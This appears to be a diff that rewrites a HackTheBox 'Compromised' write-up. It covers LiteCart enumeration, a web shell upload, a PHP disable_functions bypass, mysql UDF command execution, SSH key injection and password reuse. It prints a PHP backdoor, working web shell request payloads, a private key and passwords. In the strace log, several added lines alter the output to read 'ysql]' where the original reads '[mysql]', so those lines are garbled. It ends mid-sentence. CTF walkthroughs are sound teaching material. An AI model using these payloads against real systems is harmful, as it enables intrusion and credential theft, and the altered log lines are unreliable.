@@ -6,18 +6,14 @@ points: 40
 rating: 3.9
 date: 2020-09-12
 avatar: assets/htb/compromised.png
-source: https://github.com/zweilosec/htb-writeups (MIT)
 htb_url: https://app.hackthebox.com/machines/Compromised
 ---
-## Overview
-
-TODO: finish writeup, and clean up
 
 ## Enumeration
 
 ### Nmap scan
 
-I started my enumeration with an nmap scan of `<YOUR_IP>`. The options I regularly use are: `-p-`, which is a shortcut which tells nmap to scan all ports, `-sC` is the equivalent to `--script=default` and runs a collection of nmap enumeration scripts against the target, `-sV` does a service scan, and `-oA <name>` saves the output with a filename of `<name>`.
+I kicked things off with an nmap scan against `<YOUR_IP>`. My usual flags are: `-p-` to cover every port, `-sC` (the same as `--script=default`) to fire the default enumeration scripts at the host, `-sV` for service detection, and `-oA <name>` to write the results out under the filename `<name>`.
 
 ```text
 ┌──(kac0㉿kali)-[~/htb/compromised]
@@ -71,37 +67,37 @@ Service detection performed. Please report any incorrect results at https://nmap
 Nmap done: 1 IP address (1 host up) scanned in 210.64 seconds
 ```
 
-Only two ports open, 22 - SSH, and 80 - HTTP
+Just two ports were exposed: 22 - SSH and 80 - HTTP
 
 ### Port 80 - HTTP
 
-![](https://raw.githubusercontent.com/kac0/htb-writeups/master/.gitbook/assets/1-compromised-duckies.png)
+![](assets/wu/compromised/img-1.png)
 
-Website selling rubber duckies on port 80; 
+Port 80 served a shop that sells rubber duckies; 
 
-![](https://raw.githubusercontent.com/kac0/htb-writeups/master/.gitbook/assets/4-litecart.png)
+![](assets/wu/compromised/img-2.png)
 
-`Powered by LiteCart` need to find version to see if there are any vulnerabilities
+`Powered by LiteCart` - I needed to pin down the version to check for known vulnerabilities
 
-![](https://raw.githubusercontent.com/kac0/htb-writeups/master/.gitbook/assets/3-admin.png)
+![](assets/wu/compromised/img-3.png)
 
-In the contact information found an email address `admin@compromised.htb`, which gave me a potential username, and a domain name.  I added this to my `/etc/hosts` file. 
+The contact details listed an email address, `admin@compromised.htb`, handing me both a candidate username and a domain name. I dropped this into my `/etc/hosts` file. 
 
-![](https://raw.githubusercontent.com/kac0/htb-writeups/master/.gitbook/assets/5-create-account.png)
+![](assets/wu/compromised/img-4.png)
 
-Created an account on the site
+Registered an account on the site
 
-![](https://raw.githubusercontent.com/kac0/htb-writeups/master/.gitbook/assets/6-reset-password-fail.png)
+![](assets/wu/compromised/img-5.png)
 
-I tried to reset the password for the email address I had found, but was told that it didn't exist in the database.  I could potentially use this to find valid users later since the error is too verbose.
+Attempting a password reset for the address I'd discovered returned a message saying it wasn't in the database. That overly verbose error could be handy later for enumerating valid users.
 
-No SQL injection was possible in the input fields.
+None of the input fields were vulnerable to SQL injection.
 
-I ran dirbuster and found a folder `/backup`. 
+Running dirbuster turned up a `/backup` folder. 
 
-![](https://raw.githubusercontent.com/kac0/htb-writeups/master/.gitbook/assets/2-compromised-backup.png)
+![](assets/wu/compromised/img-6.png)
 
-`/backup` contained a zip file `a.tar.gz`
+Inside `/backup` was an archive named `a.tar.gz`
 
 ```text
 ┌──(kac0㉿kali)-[~/htb/compromised]
@@ -197,7 +193,7 @@ shop/ext/
 shop/ext/index.html
 ```
 
-It seemed like a backup of the whole file structure of the site. There definitely had to be some interesting information in here, but there was a lot to go through. After searching through the files for awhile, it looked like the site had been compromised at some point, since there was a PHP backdoor included in the backup.
+This appeared to be a full backup of the site's directory tree. There was bound to be something useful inside, but a lot of files to sift through. After digging around for a while it became clear the site had been compromised at some point, because the backup shipped with a PHP backdoor.
 
 ```text
 ┌──(kac0㉿kali)-[~/htb/compromised/shop]
@@ -212,15 +208,13 @@ Sitemap: /feeds/sitemap.xml
 <?php system($_REQUEST['cmd']); ?>
 ```
 
-The `robots.txt` and `sitemap.xml` did not exist on the live site, perhaps they were removed after the site was compromised?
+Neither `robots.txt` nor `sitemap.xml` were present on the live site - maybe they were stripped out after the compromise?
 
-![](https://raw.githubusercontent.com/kac0/htb-writeups/master/.gitbook/assets/7-no-robots.png)
+![](assets/wu/compromised/img-7.png)
 
-![](https://raw.githubusercontent.com/kac0/htb-writeups/master/.gitbook/assets/7-no-sitemap.png)
+![](assets/wu/compromised/img-8.png)
 
-{% hint style="info" %}
-Post-completion edit: yes these files exist, I had been looking for them in the root, not in the **`/shop`** directory.
-{% endhint %}
+Edit after finishing: these files do in fact exist - I'd been checking the web root instead of the **`/shop`** directory.
 
 ```text
 ┌──(kac0㉿kali)-[~/htb/compromised/shop/admin]
@@ -228,15 +222,15 @@ Post-completion edit: yes these files exist, I had been looking for them in the 
 admin/login.php:    //file_put_contents("./.log2301c9430d8593ae.txt", "User: " . $_POST['username'] . " Passwd: " . $_POST['password']);
 ```
 
-![](https://raw.githubusercontent.com/kac0/htb-writeups/master/.gitbook/assets/8-again-logfile-includes-library.png)
+![](assets/wu/compromised/img-9.png)
 
-![](https://raw.githubusercontent.com/kac0/htb-writeups/master/.gitbook/assets/8-pass-grep.png)
+![](assets/wu/compromised/img-10.png)
 
-The `/admin` folder looked like a good place to start searching. I did a search for passwords in the files, and 
+The `/admin` folder seemed like a sensible starting point. I grepped the files for passwords, and 
 
-![](https://raw.githubusercontent.com/kac0/htb-writeups/master/.gitbook/assets/8-login-php.png)
+![](assets/wu/compromised/img-11.png)
 
-the login page of the admin folder contained a reference to a log file that usernames and passwords were being written to
+the admin folder's login page referenced a log file that usernames and passwords were being written to
 
 ```text
 ┌──(kac0㉿kali)-[~/htb/compromised/shop/admin]
@@ -272,7 +266,7 @@ drwxr-xr-x  2 kac0 kac0 4096 May 28  2020 users.app
 drwxr-xr-x  2 kac0 kac0 4096 May 28  2020 vqmods.app
 ```
 
-The file `login.php` had been modified more recently than everything else here, perhaps to comment out that line
+`login.php` had a more recent modification time than the rest of the files here, likely from commenting out that line
 
 ```text
 ┌──(kac0㉿kali)-[~/htb/compromised/shop/includes]
@@ -298,7 +292,7 @@ drwxr-xr-x  2 kac0 kac0 4096 May 14  2018 routes
 drwxr-xr-x  4 kac0 kac0 4096 May 14  2018 templates
 ```
 
-The `/includes/library` folder had also been modified on Sep 3
+The `/includes/library` folder was likewise modified on Sep 3
 
 ```text
 ┌──(kac0㉿kali)-[~/…/compromised/shop/includes/library]
@@ -334,23 +328,23 @@ drwxr-xr-x 11 kac0 kac0  4096 Dec 26 18:26 ..
 -rw-r--r--  1 kac0 kac0  2371 May 14  2018 lib_weight.inc.php
 ```
 
-Checking the files in this folder lead to `lib_user.inc.php`. This file was also modified on September 3, and contained references to same hidden log file.
+Going through this folder led me to `lib_user.inc.php`. It too had been changed on September 3 and referenced the same hidden log file.
 
-![](https://raw.githubusercontent.com/kac0/htb-writeups/master/.gitbook/assets/8-passhash-found.png)
+![](assets/wu/compromised/img-12.png)
 
-![](https://raw.githubusercontent.com/kac0/htb-writeups/master/.gitbook/assets/8-passhash-file.png)
+![](assets/wu/compromised/img-13.png)
 
-searching the rest of the folders found password hash in `includes/config.inc.php` 
+searching the remaining folders surfaced a password hash in `includes/config.inc.php` 
 
 ```text
 includes/config.inc.php:  define('PASSWORD_SALT', 'kg1T5n2bOEgF8tXIdMnmkcDUgDqOLVvACBuYGGpaFkOeMrFkK0BorssylqdAP48Fzbe8ylLUx626IWBGJ00ZQfOTgPnoxue1vnCN1amGRZHATcRXjoc6HiXw0uXYD9mI');
 ```
 
-I tried cracking this hash using hashcat, but was unsuccessful.
+I threw this hash at hashcat but couldn't crack it.
 
-![](https://raw.githubusercontent.com/kac0/htb-writeups/master/.gitbook/assets/8-database-info.png)
+![](assets/wu/compromised/img-14.png)
 
-This file also included possible database creds and names of all of the tables
+The same file also held likely database credentials along with the names of every table
 
 ```text
 ┌──(kac0㉿kali)-[~/htb/compromised/shop]
@@ -359,7 +353,7 @@ admin/login.php:    //file_put_contents("./.log2301c9430d8593ae.txt", "User: " .
 includes/library/lib_user.inc.php:      //file_put_contents("./.log2301c9430d8593ae.txt", "User: " . $username . " Passwd: " . $password);
 ```
 
-After getting sidetracked for awhile looking for potential passwords and hashes, I went back to looking at the modified files.  Both files contained the same reference to this hidden log file, and both had been modified on Sep 3
+After a detour chasing potential passwords and hashes, I returned to the modified files. Both pointed at the same hidden log file, and both had been touched on Sep 3
 
 ```text
 ┌──(kac0㉿kali)-[~/htb/compromised/shop]
@@ -372,25 +366,25 @@ After getting sidetracked for awhile looking for potential passwords and hashes,
 ./includes/library/lib_user.inc.php
 ```
 
-There were only a few files modified on that day; There were no files in `/admin/users.app/` that had been modified that day, so something had likely been deleted from there
+Only a handful of files were changed that day; nothing inside `/admin/users.app/` had been modified then, which suggested something had probably been deleted from it
 
-![](https://raw.githubusercontent.com/kac0/htb-writeups/master/.gitbook/assets/8-found-pass.png)
+![](assets/wu/compromised/img-15.png)
 
-I found the log file by navigating to it in my browser.  The file contained credentials for an admin user `User: admin Passwd: theNextGenSt0r3!~`
+Browsing directly to the log file revealed admin credentials inside it: `User: admin Passwd: theNextGenSt0r3!~`
 
-![](https://raw.githubusercontent.com/kac0/htb-writeups/master/.gitbook/assets/9-admin-login.png)
+![](assets/wu/compromised/img-16.png)
 
-Using these creds I tried to login to the admin page; 
+I used these creds to log into the admin page; 
 
-after logging in I got an interesting message that said some thing of the sort: "The last time you logged in was at IP 10.10.14.27. If this was not you your credentials may have been compromised". Unfortunately the message disappeared before I could screenshot it. 
+once authenticated I saw a notable message along the lines of: "The last time you logged in was at IP 10.10.14.27. If this was not you your credentials may have been compromised". The message vanished before I could grab a screenshot. 
 
-![](https://raw.githubusercontent.com/kac0/htb-writeups/master/.gitbook/assets/9-comprmised-creds-lol.png)
+![](assets/wu/compromised/img-17.png)
 
-There was also a banner that said that the admin account was not `.htpasswd` protected
+A banner also warned that the admin account wasn't `.htpasswd` protected
 
 ![](https://raw.githubusercontent.com/kac0/htb-writeups/master/.gitbook/assets/9-upload-success%2520%25281%2529.png)
 
-I noticed in the bottom corner of the page that the version of LiteCart they were using was 2.1.2, so I looked up whether there were any known vulnerabilities associated with that version
+In the bottom corner of the page I spotted that the LiteCart version was 2.1.2, so I checked for any known vulnerabilities tied to that release
 
 * [https://medium.com/@foxsin34/litecart-2-1-2-arbitrary-file-upload-authenticated-1b962df55a45](https://medium.com/@foxsin34/litecart-2-1-2-arbitrary-file-upload-authenticated-1b962df55a45)
 * [https://www.exploit-db.com/exploits/45267](https://www.exploit-db.com/exploits/45267)
@@ -404,7 +398,7 @@ parser.add_argument('-u',
                     help='admin username')
 ```
 
-To use the exploit I needed to supply admin credentials, and the path of the admin login page. Luckily I already had that information. Sadly, the exploit was written in python2 so I had to do a bit of work to get it to run
+The exploit required admin credentials plus the admin login page path, both of which I already had. Unfortunately it was written for python2, so I had to massage it a little to get it running
 
 [https://stackoverflow.com/questions/8405096/python-3-2-cookielib](https://stackoverflow.com/questions/8405096/python-3-2-cookielib)
 
@@ -414,55 +408,55 @@ To use the exploit I needed to supply admin credentials, and the path of the adm
 Sorry something went wrong
 ```
 
-hmmm...next I looked at the code in the python exploit and manually tried to exploit it.
+hmmm...so I read through the python exploit's code and attempted the exploitation by hand.
 
-![](https://raw.githubusercontent.com/kac0/htb-writeups/master/.gitbook/assets/9-file-upload.png)
+![](assets/wu/compromised/img-19.png)
 
-Files to upload had to be `.xml`.
+Uploaded files had to carry an `.xml` extension.
 
-![](https://raw.githubusercontent.com/kac0/htb-writeups/master/.gitbook/assets/9-upload-test.png)
+![](assets/wu/compromised/img-20.png)
 
-I was able to upload my web-shell and access it by disquising it as an xml file using burp
+By disguising my web-shell as an xml file with burp, I managed to upload it and reach it
 
-![](https://raw.githubusercontent.com/kac0/htb-writeups/master/.gitbook/assets/9-upload-success-usd-.png)
+![](assets/wu/compromised/img-21.png)
 
- Upload success
+ The upload succeeded
 
 ![](https://raw.githubusercontent.com/kac0/htb-writeups/master/.gitbook/assets/9-command-timeout%2520%25281%2529%2520%25281%2529.png)
 
-I could not get any commands to run. They would all time out, so I guessed there was a firewall or something blocking it
+No commands would execute - every one timed out, leading me to suspect a firewall or similar was blocking them
 
 * [https://www.thoughtco.com/what-version-of-php-running-2694207](https://www.thoughtco.com/what-version-of-php-running-2694207)
 
 ### Enumeration through `phpinfo()`
 
-![](https://raw.githubusercontent.com/kac0/htb-writeups/master/.gitbook/assets/10-php-info1.png)
+![](assets/wu/compromised/img-23.png)
 
-I tried to get the version of PHP that the server was running using the `phpinfo()` method, and got back a ton of information from the server. There was pages and pages of configuration and environment information about the server and the current running context. version 7.2.24-0ubuntu0.18.04.6
+I used the `phpinfo()` method to identify the server's PHP version and was rewarded with an enormous dump of data - pages upon pages of configuration and environment details about the server and its current runtime context. version 7.2.24-0ubuntu0.18.04.6
 
-![](https://raw.githubusercontent.com/kac0/htb-writeups/master/.gitbook/assets/10-php-info2.png)
+![](assets/wu/compromised/img-24.png)
 
-More information, user context is www-data
+Further details - the user context is www-data
 
-![](https://raw.githubusercontent.com/kac0/htb-writeups/master/.gitbook/assets/10-php-info3.png)
+![](assets/wu/compromised/img-25.png)
 
 Information overload
 
 ### The PHP `disabled_functions`
 
-![](https://raw.githubusercontent.com/kac0/htb-writeups/master/.gitbook/assets/10-php-info4.png)
+![](assets/wu/compromised/img-26.png)
 
-After looking closely through all of the output, I noticed that there was a section called "disabled functions" which held all of the methods of code execution that I knew of 
+Reading carefully through the output, I came across a "disabled functions" section that listed every code execution method I was aware of 
 
-![](https://raw.githubusercontent.com/kac0/htb-writeups/master/.gitbook/assets/10-php-info5.png)
+![](assets/wu/compromised/img-27.png)
 
-There were many functions disabled.  Most had to do with executing code in some way, and some other interesting sounding php functions I didn't know of...but couldn't use here anyway
+A large number of functions were disabled. Most were related to code execution one way or another, alongside a few intriguing php functions I'd never heard of...not that I could use them here anyway
 
 ```php
 system,passthru,popen,shell_exec,proc_open,exec,fsockopen,socket_create,curl_exec,curl_multi_exec,mail,putenv,imap_open,parse_ini_file,show_source,file_put_contents,fwrite,pcntl_alarm,pcntl_fork,pcntl_waitpid,pcntl_wait,pcntl_wifexited,pcntl_wifstopped,pcntl_wifsignaled,pcntl_wifcontinued,pcntl_wexitstatus,pcntl_wtermsig,pcntl_wstopsig,pcntl_signal,pcntl_signal_get_handler,pcntl_signal_dispatch,pcntl_get_last_error,pcntl_strerror,pcntl_sigprocmask,pcntl_sigwaitinfo,pcntl_sigtimedwait,pcntl_exec,pcntl_getpriority,pcntl_setpriority,pcntl_async_signals,
 ```
 
-I searched for a possible vulnerability in this version of PHP to see if there was a way to re-enable functions or something like that and found
+I hunted for a vulnerability in this PHP version that might let me re-enable functions or work around the restriction, and turned up
 
 * [https://lab.wallarm.com/rce-in-php-or-how-to-bypass-disable\_functions-in-php-installations-6ccdbf4f52bb/](https://lab.wallarm.com/rce-in-php-or-how-to-bypass-disable_functions-in-php-installations-6ccdbf4f52bb/)
 * [https://www.netsparker.com/blog/web-security/bypass-disabled-system-functions/](https://www.netsparker.com/blog/web-security/bypass-disabled-system-functions/)
@@ -474,60 +468,58 @@ The last one only works up to 7.2.19,
 
 * [https://github.com/mm0r1/exploits/blob/master/php7-gc-bypass/exploit.php](https://github.com/mm0r1/exploits/blob/master/php7-gc-bypass/exploit.php)
 
-but there was another one from the same author that work up to 7.3; I modified the exploit POC to allow me to supply arbitrary commands, uploaded it, and tested it.
+but the same author had another that worked up to 7.3; I tweaked the PoC so I could feed it arbitrary commands, uploaded it, and gave it a try.
 
-![](https://raw.githubusercontent.com/kac0/htb-writeups/master/.gitbook/assets/10-code-execution.png)
+![](assets/wu/compromised/img-28.png)
 
-Success! I had code execution. I was running in the context of `www-data`
+It worked! I now had code execution, running as `www-data`
 
-![](https://raw.githubusercontent.com/kac0/htb-writeups/master/.gitbook/assets/10-code-execution-passwd.png)
+![](assets/wu/compromised/img-29.png)
 
-Got `/etc/passwd` There were three users who could login: sysadmin, mysql, and root
+Read `/etc/passwd` - three accounts could log in: sysadmin, mysql, and root
 
 ### The `mysql` daemon
 
-![](https://raw.githubusercontent.com/kac0/htb-writeups/master/.gitbook/assets/11-pas-aux-mysql.png)
+![](assets/wu/compromised/img-30.png)
 
-Checked output of `ps aux` and noticed mysqld was running. Perhaps I could enumerate the database since I had seen the tables and login information earlier
+Looking at `ps aux`, I saw mysqld was running. Since I'd already seen the tables and login info earlier, maybe I could enumerate the database
 
-![](https://raw.githubusercontent.com/kac0/htb-writeups/master/.gitbook/assets/11-mysql.png)
+![](assets/wu/compromised/img-31.png)
 
-I checked to see what configuration files there were for mysqld
+I looked into which configuration files existed for mysqld
 
-![](https://raw.githubusercontent.com/kac0/htb-writeups/master/.gitbook/assets/11-mysql-running.png)
+![](assets/wu/compromised/img-32.png)
 
-Found a way to execute shell commands using mysql
+Discovered a way to run shell commands through mysql
 
 * [https://electrictoolbox.com/run-single-mysql-query-command-line/](https://electrictoolbox.com/run-single-mysql-query-command-line/)
 * [https://dev.mysql.com/doc/refman/8.0/en/mysql-commands.html](https://dev.mysql.com/doc/refman/8.0/en/mysql-commands.html)
 
-If there was a way to do this, maybe from the command line too
+If it could be done at all, perhaps it could be done from the command line too
 
-![](https://raw.githubusercontent.com/kac0/htb-writeups/master/.gitbook/assets/11-mysql-databases.png)
+![](assets/wu/compromised/img-33.png)
 
-Enumerated databases
+Listed the databases
 
-![](https://raw.githubusercontent.com/kac0/htb-writeups/master/.gitbook/assets/11-mysql-ecom-tables.png)
+![](assets/wu/compromised/img-34.png)
 
 `GET /shop/vqmod/xml/cantfindmyshell.php?var=mysql+-u+root+-pchangethis+-v+-e+"show+tables"+ecom HTTP/1.1`
 
-Listed tables in the `ecom` database.
+Enumerated the tables within the `ecom` database.
 
 ![](https://raw.githubusercontent.com/kac0/htb-writeups/master/.gitbook/assets/11-mysql-code-exec%2520%25281%2529.png)
 
-got code execution with `GET /shop/vqmod/xml/cantfindmyshell.php?var=mysql+-u+root+-pchangethis+-v+-e+"system+id"+ecom HTTP/1.1`
+achieved code execution with `GET /shop/vqmod/xml/cantfindmyshell.php?var=mysql+-u+root+-pchangethis+-v+-e+"system+id"+ecom HTTP/1.1`
 
-{% hint style="info" %}
-had to specify -e to execute SQL commands, system to run system commands, and had to end the line with the database name 'ecom'
-{% endhint %}
+I had to pass -e to run SQL, use system for OS commands, and finish the line with the database name 'ecom'
 
-Unfortunately, I was still executing commands as `www-data` however, need to figure out how to escalate privileges; Found an interesting thing in the mysql references that talks about user defined variables
+The catch was that I was still executing as `www-data`, so I needed a way to escalate; the mysql reference had something interesting about user-defined variables
 
 > User-defined variables are session specific. A user variable defined by one client cannot be seen or used by other clients.
 
 [https://dev.mysql.com/doc/refman/8.0/en/performance-schema-user-defined-functions-table.html](https://dev.mysql.com/doc/refman/8.0/en/performance-schema-user-defined-functions-table.html)
 
-There was also a section on user-defined functions
+There was also a section covering user-defined functions
 
 ```text
 --------------
@@ -568,7 +560,7 @@ time_zone_transition_type
 user
 ```
 
-I started browsing through the `mysql` database
+I began poking around the `mysql` database
 
 ```text
 --------------
@@ -582,7 +574,7 @@ localhost    mysql.sys    N    N    N    N    N    N    N    N    N    N    N   
 localhost    debian-sys-maint    Y    Y    Y    Y    Y    Y    Y    Y    Y    Y    Y    Y    Y    Y    Y    Y    Y    Y    Y    Y    Y    Y    Y    Y    Y    Y    Y    Y    Y                    0    0    0    0    mysql_native_password    *7CDDF050D9C0BC9EB6FDFE3C9CBC1E5F852A9F7A    N    2020-05-08 16:02:16    NULL    N
 ```
 
-Found the credentials for the root user for mysql
+Recovered the mysql root user's credentials
 
 ```text
 --------------
@@ -593,15 +585,15 @@ name    ret    dl    type
 exec_cmd    0    libmysql.so    function
 ```
 
-There was one function stored in the `func` table in the `mysql` database called `exec_cmd`.  I tried to use this function directly, but id didn't work.  After some trial and error I found out that it had to used together with the `SELECT` SQL command.
+The `func` table in the `mysql` database held a single function named `exec_cmd`. Calling it directly didn't work, but after some experimentation I realized it had to be invoked via the `SELECT` SQL command.
 
-![](https://raw.githubusercontent.com/kac0/htb-writeups/master/.gitbook/assets/11-mysql-code-exec2.png)
+![](assets/wu/compromised/img-36.png)
 
 `GET /shop/vqmod/xml/cantfindmyshell.php?var=mysql+-u+root+-pchangethis+-v+-e+"select+exec_cmd('id')"+mysql HTTP/1.1`
 
-From these results I could see that this function was running in the context of the user `mysql`. Since I knew that this user could log in, I tried to insert my SSH public key into their `.ssh/authorized_keys` file so I could login using SSH.
+The results showed the function was executing as the `mysql` user. Knowing that account could log in, I went to append my SSH public key to its `.ssh/authorized_keys` file so I could SSH in.
 
-![](https://raw.githubusercontent.com/kac0/htb-writeups/master/.gitbook/assets/11-mysql-mysql-sshkey.png)
+![](assets/wu/compromised/img-37.png)
 
 `GET /shop/vqmod/xml/cantfindmyshell.php?var=mysql+-u+root+-pchangethis+-v+-e+"select+exec_cmd('echo+ecdsa-sha2-nistp256+AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBLNqKR/rHfuv30j7eOmU85z%2bEKhPfUFtn9WEARBZzwF6LFTCgjZzqAF0GevT3b22Z5iqwETgfF%2bQcmjAw3Ld9VY%3d+>>+~/.ssh/authorized_keys')"+mysql HTTP/1.1`
 
@@ -657,7 +649,7 @@ drwxr-xr-x 24 root root     4096 Sep  9 12:02 ..
 drwxr-x---  2 root sysadmin 4096 Aug 31 03:16 sysadmin
 ```
 
-My SSH key injection was sucessfull, and I was able to SSH into the box.  I was able to login as `mysql`, but there was no `user.txt` in sight. It looked like I needed to move laterally to `sysadmin` first.
+The SSH key injection worked and I logged into the box as `mysql`, but there was no `user.txt` anywhere. I'd evidently need to pivot laterally to `sysadmin` first.
 
 ```text
 mysql@compromised:~$ cat private_key.pem 
@@ -690,7 +682,7 @@ kr4uBVfsyTeGWCgelq6x7avuTmMFVJn4iUX0czwbiqOOx1y0Fyliog==
 -----END RSA PRIVATE KEY-----
 ```
 
-I exfiltrated the user's private SSH key so I could log in as needed in the future.  \(Why the `mysql` user has a SSH key is a question for another time!\)
+I grabbed the user's private SSH key so I could log back in whenever needed. \(Why the `mysql` user even has an SSH key is a mystery for another day!\)
 
 ### Finding user creds
 
@@ -701,7 +693,7 @@ server-uuid=4667b165-9145-11ea-aaf7-000c29fa914e
 mysql@compromised:~$ cat strace-log.dat
 ```
 
-I wasnt sure what the `strace.log` was, so I did some research.
+I didn't know what the `strace.log` was, so I did a bit of reading.
 
 * [https://www.percona.com/blog/2020/06/30/analyzing-mysql-with-strace/](https://www.percona.com/blog/2020/06/30/analyzing-mysql-with-strace/)
 
@@ -709,7 +701,7 @@ I wasnt sure what the `strace.log` was, so I did some research.
 
 * [https://stackoverflow.com/questions/568564/how-can-i-view-live-mysql-queries](https://stackoverflow.com/questions/568564/how-can-i-view-live-mysql-queries)
 
-The file had a ton of output, so I filtered it for lines where mysql had been run.
+The file was huge, so I narrowed it down to the lines where mysql had been executed.
 
 ```text
 mysql@compromised:~$ cat strace-log.dat | grep mysql
@@ -720,16 +712,16 @@ mysql@compromised:~$ cat strace-log.dat | grep mysql
 22227 03:11:09 openat(AT_FDCWD, "/etc/mysql/conf.d/", O_RDONLY|O_NONBLOCK|O_CLOEXEC|O_DIRECTORY) = 4
 22227 03:11:09 stat("/etc/mysql/conf.d/mysql.cnf", {st_mode=S_IFREG|0644, st_size=8, ...}) = 0
 22227 03:11:09 openat(AT_FDCWD, "/etc/mysql/conf.d/mysql.cnf", O_RDONLY) = 4
-22227 03:11:09 read(4, "[mysql]\n", 4096) = 8
+22227 03:11:09 read(4, "ysql]\n", 4096) = 8
 22227 03:11:09 stat("/etc/mysql/conf.d/mysqldump.cnf", {st_mode=S_IFREG|0644, st_size=55, ...}) = 0
 22227 03:11:09 openat(AT_FDCWD, "/etc/mysql/conf.d/mysqldump.cnf", O_RDONLY) = 4
-22227 03:11:09 read(4, "[mysqldump]\nquick\nquote-names\nma"..., 4096) = 55
+22227 03:11:09 read(4, "ysqldump]\nquick\nquote-names\nma"..., 4096) = 55
 22227 03:11:09 openat(AT_FDCWD, "/etc/mysql/mysql.conf.d/", O_RDONLY|O_NONBLOCK|O_CLOEXEC|O_DIRECTORY) = 4
 22227 03:11:09 stat("/etc/mysql/mysql.conf.d/mysqld.cnf", {st_mode=S_IFREG|0644, st_size=3064, ...}) = 0
 22227 03:11:09 openat(AT_FDCWD, "/etc/mysql/mysql.conf.d/mysqld.cnf", O_RDONLY) = 4
 22227 03:11:09 stat("/etc/mysql/mysql.conf.d/mysqld_safe_syslog.cnf", {st_mode=S_IFREG|0644, st_size=21, ...}) = 0
 22227 03:11:09 openat(AT_FDCWD, "/etc/mysql/mysql.conf.d/mysqld_safe_syslog.cnf", O_RDONLY) = 4
-22227 03:11:09 read(4, "[mysqld_safe]\nsyslog\n", 4096) = 21
+22227 03:11:09 read(4, "ysqld_safe]\nsyslog\n", 4096) = 21
 22227 03:11:09 write(2, "mysql: ", 7)   = 7
 22227 03:11:09 stat("/usr/share/mysql/charsets/Index.xml", {st_mode=S_IFREG|0644, st_size=19404, ...}) = 0
 22227 03:11:09 openat(AT_FDCWD, "/usr/share/mysql/charsets/Index.xml", O_RDONLY) = 3
@@ -741,16 +733,16 @@ mysql@compromised:~$ cat strace-log.dat | grep mysql
 22228 03:11:15 openat(AT_FDCWD, "/etc/mysql/conf.d/", O_RDONLY|O_NONBLOCK|O_CLOEXEC|O_DIRECTORY) = 4
 22228 03:11:15 stat("/etc/mysql/conf.d/mysql.cnf", {st_mode=S_IFREG|0644, st_size=8, ...}) = 0
 22228 03:11:15 openat(AT_FDCWD, "/etc/mysql/conf.d/mysql.cnf", O_RDONLY) = 4
-22228 03:11:15 read(4, "[mysql]\n", 4096) = 8
+22228 03:11:15 read(4, "ysql]\n", 4096) = 8
 22228 03:11:15 stat("/etc/mysql/conf.d/mysqldump.cnf", {st_mode=S_IFREG|0644, st_size=55, ...}) = 0
 22228 03:11:15 openat(AT_FDCWD, "/etc/mysql/conf.d/mysqldump.cnf", O_RDONLY) = 4
-22228 03:11:15 read(4, "[mysqldump]\nquick\nquote-names\nma"..., 4096) = 55
+22228 03:11:15 read(4, "ysqldump]\nquick\nquote-names\nma"..., 4096) = 55
 22228 03:11:15 openat(AT_FDCWD, "/etc/mysql/mysql.conf.d/", O_RDONLY|O_NONBLOCK|O_CLOEXEC|O_DIRECTORY) = 4
 22228 03:11:15 stat("/etc/mysql/mysql.conf.d/mysqld.cnf", {st_mode=S_IFREG|0644, st_size=3064, ...}) = 0
 22228 03:11:15 openat(AT_FDCWD, "/etc/mysql/mysql.conf.d/mysqld.cnf", O_RDONLY) = 4
 22228 03:11:15 stat("/etc/mysql/mysql.conf.d/mysqld_safe_syslog.cnf", {st_mode=S_IFREG|0644, st_size=21, ...}) = 0
 22228 03:11:15 openat(AT_FDCWD, "/etc/mysql/mysql.conf.d/mysqld_safe_syslog.cnf", O_RDONLY) = 4
-22228 03:11:15 read(4, "[mysqld_safe]\nsyslog\n", 4096) = 21
+22228 03:11:15 read(4, "ysqld_safe]\nsyslog\n", 4096) = 21
 22228 03:11:15 write(2, "mysql: ", 7)   = 7
 22228 03:11:15 stat("/usr/share/mysql/charsets/Index.xml", {st_mode=S_IFREG|0644, st_size=19404, ...}) = 0
 22228 03:11:15 openat(AT_FDCWD, "/usr/share/mysql/charsets/Index.xml", O_RDONLY) = 3
@@ -759,7 +751,7 @@ mysql@compromised:~$ cat strace-log.dat | grep mysql
 22229 03:11:18 execve("/usr/bin/mysql", ["mysql", "-u", "root", "--password=changethis"], 0x55bc62467900 /* 21 vars */) = 0
 ```
 
-It looked like the password had been changed a few times. I took note of each of the passwords to see if any of them had been reused.  Using the password `3*NLJE32I$Fe` I was able to switch users to `sysadmin`.
+The password appeared to have been rotated several times. I jotted down each one to test for reuse, and the password `3*NLJE32I$Fe` let me switch to `sysadmin`.
 
 ### User.txt
 
@@ -790,7 +782,7 @@ sudo: unable to resolve host compromised: Resource temporarily unavailable
 Sorry, user sysadmin may not run sudo on compromised.
 ```
 
-The user `sysadmin` was not able to use `sudo`.  \(What kind of sysadmin is this?\)
+The `sysadmin` user couldn't run `sudo`. \(What kind of sysadmin is this?\)
 
 ```text
 sysadmin@compromised:/dev/shm$ wget http://10.10.15.98/linpeas.sh
@@ -807,7 +799,7 @@ ping: sendmsg: Operation not permitted
 sysadmin@compromised:/dev/shm$
 ```
 
-I was unable to ping my computer, so I was worried that I wouldn't be able to connect back to my machine. I thought about using base64 "copy-pasta" to transfer files, but after an "Oh duh!" moment I remembered that I was able to SSH in, and therefore could use SCP to get files in.
+Pinging my own box failed, which made me worry I wouldn't be able to call back to my machine. I considered base64 "copy-pasta" for transferring files, but then had an "Oh duh!" moment - I had SSH access, so I could just use SCP to push files over.
 
 ```text
 ┌──(kac0㉿kali)-[~]
@@ -816,9 +808,9 @@ sysadmin@<YOUR_IP>'s password:
 linpeas.sh                                                            100%  286KB 435.1KB/s   00:00
 ```
 
-Unfortunately, even awesome automated tools like `linpeas.sh` can only get you so much information. In this case, it didn't supply me with much of anything to go off, so I decided to do a bit more manual enumeration.
+Unfortunately, even great automated tools like `linpeas.sh` only go so far. Here it gave me almost nothing to work with, so I switched to more manual enumeration.
 
-First I searched for obvious misconfigurations in `sshd` and other `/etc` configuration files but found nothing very interesting.  Next I used the `find` command to search for hidden files.
+I first checked `sshd` and other `/etc` config files for obvious misconfigurations but found nothing of note. Then I used `find` to hunt for hidden files.
 
 ```text
 sysadmin@compromised:/dev/shm$ find / -type f -iname ".*" -ls 2>/dev/null
@@ -848,13 +840,13 @@ sysadmin@compromised:/dev/shm$ find / -type f -iname ".*" -ls 2>/dev/null
      8708      0 -rw-r--r--   1 landscape landscape        0 Feb  3  2020 /var/lib/landscape/.cleanup.user
 ```
 
-There were a lot of hidden files, but one that stuck out was the file:
